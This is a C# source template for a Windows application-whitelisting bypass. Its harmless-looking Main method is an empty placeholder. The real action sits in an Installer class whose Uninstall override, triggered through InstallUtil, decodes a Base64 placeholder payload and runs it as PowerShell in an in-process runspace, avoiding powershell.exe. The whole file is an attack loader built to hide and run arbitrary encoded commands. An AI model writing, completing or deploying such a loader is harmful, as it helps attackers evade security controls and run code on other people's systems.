using System;
 using System.Configuration.Install;
 using System.Runtime.InteropServices;
 using System.Management.Automation.Runspaces;
 public class Program
 {
  public static void Main()
  {
   //$$$NORMAL$$$
  }
 }

 [System.ComponentModel.RunInstaller(true)]
 public class Sample : System.Configuration.Install.Installer
 {
  public override void Uninstall(System.Collections.IDictionary savedState)
  {
   Cool.DoStuff();
  }
 }
 public class Cool
 {
  public static void DoStuff()
  {
 
   string command = Base64Decode($$$ENCODED$$$);
   RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
   Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
   rspace.Open();
   Pipeline pipeline = rspace.CreatePipeline();
   pipeline.Commands.AddScript(command);
   pipeline.Invoke();
  }
 
 
  public static string Base64Decode(string base64EncodedData) {
   byte[] base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
   return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
  }

 }
